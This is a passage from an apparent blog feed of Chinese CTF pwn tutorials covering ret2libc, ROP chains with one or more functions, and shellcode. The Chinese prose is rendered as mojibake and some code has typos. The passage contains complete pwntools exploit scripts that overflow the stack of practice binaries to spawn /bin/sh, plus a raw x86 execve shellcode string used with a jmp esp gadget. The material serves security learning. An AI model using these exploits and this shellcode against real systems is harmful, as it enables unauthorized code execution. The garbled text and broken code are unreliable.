ä¸Šè¾“å…¥å¯¹åº”çš„å‡½æ•°åå’Œåœ°å€æ‰¾åˆ° 1ibc ç‰ˆæœ¬ã€‚</li><li>ä½¿ç”¨pythonåº“libcsearcher</li></ol><p><strong>è¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹ç¬¬ä¸‰ç§</strong></p><ol><li><strong>å®‰è£…</strong> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/lieanu/LibcSearcher.git<br><span class="hljs-keyword">cd</span> LibcSearcher<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> develop<br></code></pre></td></tr></table></figure></li><li><strong>åŸºæœ¬ä½¿ç”¨</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs [python]">libc = LibcSearcher(&quot;func&quot;,gets_real_addr)             #å¯»æ‰¾åŒ¹é…çš„libcç‰ˆæœ¬<br>libcbase = gets_real_addr â€“ obj.dump(&quot;func&quot;)            #ç¡®å®šåŸºåœ°å€<br>system_addr = libcbase + obj.dump(&quot;system&quot;)            #system åç§»<br>bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh åç§»<br><br><br></code></pre></td></tr></table></figure>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc</a><br><strong>æ™®é€šæ ˆæº¢å‡º</strong><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349927.png"><br><strong>è¿™é‡Œè·ç¦»æ ˆåº•ä¸º0x14ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æŒ‰ç…§14ä¸ªå­—èŠ‚ç¼–å†™ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬ä½¿ç”¨cyclicçš„æ–¹æ³•åˆ¤æ–­æº¢å‡ºï¼Œå‘ç°è·ç¦»æ ˆåº•ä¸º0x1cä¸ªå­—èŠ‚</strong><br><strong>ç›´æ¥ä¸Šè„šæœ¬</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>from LibcSearcher import *<br>ret2libc = ELF(&#x27;./1&#x27;)<br>p = process(&#x27;./1&#x27;)<br>p.recvuntil(&#x27;is&#x27;)<br>binsh_addr = int(p.recvuntil(&#x27;\n&#x27; , drop=True) , 16)<br>p.recvuntil(&#x27;is&#x27;)<br>puts_addr = int(p.recvuntil(&#x27;\n&#x27; , drop = True) , 16)<br>libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)<br>base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base_addr + libc.dump(&#x27;system&#x27;)<br>payload = 32 * b&#x27;a&#x27;  + p32(system_addr) + p32(1) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><strong>åšå¥½ä½¿ç”¨python3è¿è¡Œï¼Œåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„~~~~</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™å¤šä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>æˆ‘ä»¬å·²ç»å­¦ä¼šäº†ç¼–å†™å•ä¸ªå’Œä¸¤ä¸ªç®€å•å‡½æ•°çš„ROPé“¾ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹ï¼Œç¼–å†™ROPé“¾å¤šä¸ªéœ€è¦æ³¨æ„çš„é—®é¢˜</strong><br><strong>ä¹‹å‰æˆ‘ä»¬åœ¨å­¦ä¹ ä¸¤ä¸ªå‡½æ•°çš„ROPæ—¶ï¼Œç¼–å†™äº†è¿™æ ·çš„payload</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339706.png"><br><strong>æˆ‘ä»¬å½“æ—¶æ²¡æœ‰è€ƒè™‘ï¼Œå‚æ•°å†²çªå’Œæ ˆæº¢å‡ºå¤§å°ï¼Œç°åœ¨æˆ‘ä»¬æ¥è¯´ä¸€è¯´</strong><br><strong>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šæ¬¡å­¦ä¹ çš„ä¸¤ä¸ªå‡½æ•°çš„ROPä¸­æ²¡æœ‰getså‡½æ•°ï¼Œè€Œæ˜¯readå‡½æ•°æˆ‘ä»¬æ€ä¹ˆåŠï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬è¦åƒä»¥å‰ä¸€æ ·æ„å»ºpayloadï¼Œé‚£ä¹ˆreadçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±ä¼šå’Œsystemçš„ç¬¬ä¸€ä¸ªå‚æ•°å†²çªï¼Œå¯¼è‡´æ— æ³•å°†system çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾åœ¨æ ˆä¸Šï¼Œåœ¨ç¼–å†™å¤šä¸ªå‡½æ•°çš„ROPä¸­ä¼šé‡è§è¿™æ ·çš„é—®é¢˜ï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ</strong></p><hr><p><strong>æˆ‘ä»¬éœ€è¦ç”¨åˆ°æŸä¸ªåœ°å€ä¸Šçš„ä»£ç ï¼Œè¿™ç§ä»£ç çš„åŸºæœ¬å½¢å¼ä¸ºpop*n + ret</strong><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616165524944-784500429.png"><br><strong>è¿ç”¨è¿™äº›å‘½ä»¤å°±èƒ½æŠŠå‚æ•°å¼¹å‡ºï¼Œæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopå‘½ä»¤ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ROPgadgetåº“æ¥æŸ¥æ‰¾è¿™äº›å‘½ä»¤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339232.png"><br><strong>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¯¹ä¸Šä¸€æ¬¡å­¦çš„â€™ç¼–å†™ä¸¤ä¸ªå‡½æ•°çš„ROPè¿›è¡Œæ”¹å˜ï¼Œä½¿å…¶å˜å¾—æ›´åˆç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>&quot;&quot;&quot;<br>ROPgadget --binary ./ret2libc2 --only &quot;pop|ret&quot;<br>Gadgets information<br>============================================================<br>0x0804861b : pop ebp ; ret<br>0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804839d : pop ebx ; ret<br>0x0804861a : pop edi ; pop ebp ; ret<br>0x08048619 : pop esi ; pop edi ; pop ebp ; ret<br>0x08048386 : ret<br>0x0804848e : ret 0xeac1<br><br>Unique gadgets found: 7<br>&quot;&quot;&quot;<br><br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>pop1_ret = 0x0804861b<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + p32(1)<br>payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)<br>payload += p32(system) + p32(pop1_ret) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œçœ‹ä¸€ä¸‹payloadï¼Œæ ˆæº¢å‡ºä¹‹åæ§åˆ¶è¿”å›åœ°å€ä¸ºgetsï¼Œgetsçš„è¿”å›åœ°å€ä¸ºpop1_retï¼Œgetsçš„å‚æ•°çš„bssæ®µä¸€ä¸ªåœ°å€ï¼Œåœ¨æ‰§è¡Œå®Œgetsåè¿”å›pop1_retæ‰§è¡Œpopå‘½ä»¤ä½¿getsçš„å‚æ•°å‡ºæ ˆï¼Œç„¶åæ‰§è¡Œretï¼ˆpop eipï¼‰å‘½ä»¤ï¼Œæ§åˆ¶EIPä¸ºsystemåœ°å€ï¼Œsystemä¹Ÿæ˜¯ç›¸åŒåŸç†</strong></p>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™ä¸¤ä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>å­¦ä¼šäº†ç¼–å†™å•ä¸ªROPé“¾ï¼Œä»Šå¤©å°±è¿›é˜¶ä¸€ä¸‹ï¼Œå­¦ç¼–å†™ä¿©ä¸ªå‡½æ•°çš„ROPé“¾ã€‚é€šè¿‡ä¸€é“ä¾‹é¢˜æˆ‘ä»¬ç›´æ¥ä¸Šæ‰‹</strong></p><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2">é™„ä»¶ä¸‹è½½</a><br><strong>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹ä¿æŠ¤</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340349.png"></p><p><strong>IDAåç¼–è¯‘å‘ç°æ ˆæº¢å‡º</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340701.png"><br><strong>ä½†æ˜¯æ²¡å‘ç°&#x2F;bin&#x2F;sh,è¿™æ˜¯æˆ‘ä»¬å°±æ— ä»ä¸‹æ‰‹äº†ï¼Œæˆ‘ä»¬è¦æƒ³ä¸€ä¸ªåŠæ³•åˆ›é€ &#x2F;bin&#x2F;shè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å‘ç°é¢˜ç›®æœ‰getså‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡getsè¾“å…¥&#x2F;bin&#x2F;shè¿™ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹</strong><br><strong>å…ˆé€šè¿‡æ ˆæº¢å‡ºæŠŠè¿”å›åœ°å€è¦†ç›–ä¸ºï¼Œgetså‡½æ•°ï¼Œé€šè¿‡æˆ‘ä»¬ä»¥å‰çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå’Œgetsæ ˆå‘ä¸Šä¸¤ä¸ªå­—å°±æ˜¯getsçš„å‚æ•°ï¼Œä¹Ÿå³æ˜¯æˆ‘ä»¬è¾“å…¥å‚æ•°çš„åœ°å€ï¼Œè¿™ç‚¹ä¸ç†è§£çš„å¯ä»¥æŸ¥ä¸€ä¸‹getsè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±ä¸å±•å¼€äº†ã€‚æˆ‘ä»¬å†æ§åˆ¶getsçš„è¿”å›åœ°å€ä¸ºsystemï¼Œå’Œsystemçš„å‚æ•°æˆ‘ä»¬ä¸å°±å®ç°äº†è¿›å…¥shelläº†å—ï¼Œpayloadå¦‚ä¸‹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340274.png"><br><strong>å¯¹äºè¿™é‡Œçš„bssæ®µï¼Œå¯ä»¥åœ¨ç½‘ä¸Šé˜…è¯»ä¸€ä¸‹ç›¸å…³çŸ¥è¯†ï¼Œè¿™æ ·æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±æ§åˆ¶äº†ç¨‹åºè¿›å…¥shellï¼Œå¤§å®¶å¯ä»¥ä»”ç»†æ£æ‘©ä¸€ä¸‹ï¼Œç†è§£äº†ç¼–å†™è„šæœ¬å°±å¾ˆç®€å•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + &quot;junk&quot;<br>payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™å•ä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ROPé“¾"><a href="#ä»€ä¹ˆæ˜¯ROPé“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯ROPé“¾"></a>ä»€ä¹ˆæ˜¯ROPé“¾</h2><p><strong>åœ¨æˆ‘åˆè¯†æ ˆæº¢å‡ºé‚£ç¯‡åšå®¢å·²ç»è¯¦ç»†çš„è®²äº†å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼ˆåŸºäºX86æ¡†æ¶ï¼‰ï¼Œä¸äº†è§£çš„å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰è¿™ä¸ªç†è®ºåŸºç¡€ï¼Œæ˜¯å­¦ä¸å¥½ROPçš„ã€‚ç°åœ¨æˆ‘ä»¬è¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯ROP</strong>ã€‚</p><p><strong>ROPé“¾å°±æ˜¯é€šè¿‡è¿”å›åœ°å€çš„ä¿®æ”¹æ¥å®Œæˆçš„ç¼–ç¨‹ï¼Œè°ƒç”¨ç‰¹å®šçš„å‡½æ•°çš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼ã€‚æˆ‘ä»¬å¯ä»¥è”æƒ³ä¸€ä¸‹ä½ åšçš„æœ€ç®€å•çš„æ ˆæº¢å‡ºçš„é¢˜ï¼Œè¿”å›åœ°å€è¦†ç›–systemï¼ˆ&#x2F;bin&#x2F;shï¼‰ã€‚è¿™ç§ä¹Ÿæ˜¯ä¸€ç§ROPé“¾ï¼Œåªæ˜¯æœ€ç®€å•çš„ä¸€ç§ï¼Œæ‰€ä»¥è¯´ROPä¹Ÿæ²¡æœ‰é‚£ä¹ˆé«˜ç«¯ï¼Œè¯´ç™½äº†å°±æ˜¯æ§åˆ¶è¿”å›åœ°å€ï¼Œæ§åˆ¶å‚æ•°ã€‚è¿™ç¯‡æˆ‘ä»¬æ¥è®²ä¸€ä¸‹æ€ä¹ˆæ§åˆ¶å‚æ•°</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338766.png"><br><strong>è¿™æ˜¯ä¸€ä¸ªmainå‡½æ•°è°ƒç”¨systemï¼ˆ&#x2F;bin&#x2F;sh)çš„æ ˆåˆ†å¸ƒï¼ŒæŠŠfuncå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemçš„åœ°å€ï¼Œè¿™æ—¶å€™systemå°±ä¼šä½œä¸ºä¸€ä¸ªæ–°çš„å‡½æ•°è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå¼€è¾Ÿæ ˆå¸§ï¼Œæ‰§è¡Œâ€˜push edpï¼›mov edpï¼Œespï¼›sub espï¼Œ0x â€™ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338135.png"></p><p><strong>æ ¹æ®æˆ‘ä»¬å­¦ä¹ å‡½æ•°è°ƒç”¨çš„ç†è®ºçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ—¶å€™å¯¹äºsystemå‡½æ•°ï¼Œaå°±æ˜¯å®ƒçš„è¿”å›åœ°å€ï¼Œbå°±æ˜¯å®ƒçš„å‚æ•°ï¼Œæ‰€ä»¥å°±å¯ä»¥ç¼–å†™è„šæœ¬æ§åˆ¶bçš„å†…å®¹æ¥å®ç°æ§åˆ¶å‚æ•°çš„ä¼ å…¥ï¼Œä¸‹é¢æ¥å°è¯•ç‰›åˆ€</strong></p><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338180.png"></p><p><strong>æŸ¥çœ‹ä¿æŠ¤ï¼Œå¼€äº†åœ°å€éšæœºåŒ–ï¼Œå¼€äº†NXï¼Œé‚£æˆ‘ä»¬å°±ä¸èƒ½ç”¨Shellcodeäº†ï¼ŒIDAåç¼–è¯‘ä¸€ä¸‹ï¼Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338789.png"></p><p><strong>éå¸¸ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€ä¸ºsystemï¼Œä¼ å…¥å˜é‡&#x2F;bin&#x2F;shï¼Œshift+F12æ‰“å¼€stringå‘ç°&#x2F;bin&#x2F;sh ï¼Œç›´æ¥ç¼–å†™è„šæœ¬</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&#x27;./ret2libc1&#x27;)<br>elf = ELF(&#x27;./ret2libc1&#x27;)<br>system_addr = elf.plt[&#x27;system&#x27;]<br>binsh_addr = 0x0804A028<br>p.recvuntil(&#x27;ret2libc1\n&#x27;)<br>payload = 0x108 * b&#x27;a&#x27; + p32(1) + p32(system_addr) + p32(1) + p32(binsh_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode</title>
    <link href="/2024/07/18/Shellcode/"/>
    <url>/2024/07/18/Shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Shellcode"><a href="#ä»€ä¹ˆæ˜¯Shellcode" class="headerlink" title="ä»€ä¹ˆæ˜¯Shellcode"></a>ä»€ä¹ˆæ˜¯Shellcode</h2><p><strong>ShellcodeæŒ‡çš„æ˜¯ç”¨æ¥å®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½å°±æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤ã€‚åˆ©ç”¨ret_addressè¿”å›Shellcodeå¤„æ‰§è¡Œ</strong></p><h2 id="æ€ä¹ˆç”ŸæˆShellcode"><a href="#æ€ä¹ˆç”ŸæˆShellcode" class="headerlink" title="æ€ä¹ˆç”ŸæˆShellcode"></a>æ€ä¹ˆç”ŸæˆShellcode</h2><p><strong>Shellcodeçš„ç”Ÿæˆæ–¹æ³•é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§ï¼š</strong></p><ol><li>åœ¨pwntoolsä¸­ç”±shellcraftæ¨¡å—ç”Ÿæˆ</li><li>åœ¨<a href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>ç½‘ç«™ä¸­æ ¹æ®å¹³å°å’Œç³»ç»Ÿçš„ä½æ•°è·å–</li><li>é€šè¿‡Metasploitç”Ÿæˆ</li></ol><h3 id="1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode"><a href="#1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode" class="headerlink" title="1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode"></a>1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode</h3><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png"><br>æŸ¥çœ‹ä¿æŠ¤æ²¡æœ‰å¼€NXï¼Œå¯ä»¥ç”¨Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png"><br>IDAåç¼–è¯‘å‘ç°æ ˆæº¢å‡ºï¼Œç›´æ¥ç”¨Shellcodeè¦†ç›–main_addråœ°å€æ§åˆ¶ç¨‹åºæµ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Šï¼štarget &#x3D; int(p.recvuntile(â€œ\nâ€,drop &#x3D; true) , 16)æ¥æ”¶ç›´åˆ°æ¢è¡Œç¬¦ï¼Œå¹¶ä¸”å»é™¤æ¢è¡Œç¬¦ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶</strong></p><h2 id="2ã€Shellcodeè¿›é˜¶"><a href="#2ã€Shellcodeè¿›é˜¶" class="headerlink" title="2ã€Shellcodeè¿›é˜¶"></a>2ã€Shellcodeè¿›é˜¶</h2><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png"><br><strong>æ²¡æœ‰å¼€NXä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png"><br><strong>å‘ç°æº¢å‡ºåå…«ä¸ªå­—èŠ‚ï¼Œéå¸¸å°ï¼Œæ‰€ä»¥ç”¨pwntoolsç”Ÿæˆçš„Shellcodeé•¿åº¦å¤ªé•¿ï¼Œè¿™é‡Œéœ€è¦ç”¨gadgetæ¥æ§åˆ¶EIPçš„ä½ç½®ï¼Œè·³è½¬åˆ°Shellcodeçš„åˆå§‹åœ°å€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>ä»payloadèµ·å§‹åœ°å€å¼€å§‹æ„é€ Shellcodeï¼Œä¹‹åè°ƒæ•´espåˆ°Shellcodeèµ·å§‹ä½ç½®</strong>ã€</p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨jmp_espè€Œä¸æ˜¯ç›´æ¥ç”¨Shellcodeè¦†ç›–è¿”å›åœ°å€ï¼Ÿ<br>å½“pop main_addråespåœ¨main_ä¸Šè¾¹ï¼Œç›´æ¥æ‰§è¡Œsub_esp_jmpåœ¨æ ˆå¤–æ‰§è¡Œï¼Œä¼šå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠEIPè°ƒæ•´åˆ°æ ˆå†…å†æŠŠEIPæ§åˆ¶åˆ°sub_esp_jmpè¿™æ ·å°±æ²¡æœ‰é—®é¢˜äº†</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†æ ˆæº¢å‡º</title>
    <link href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
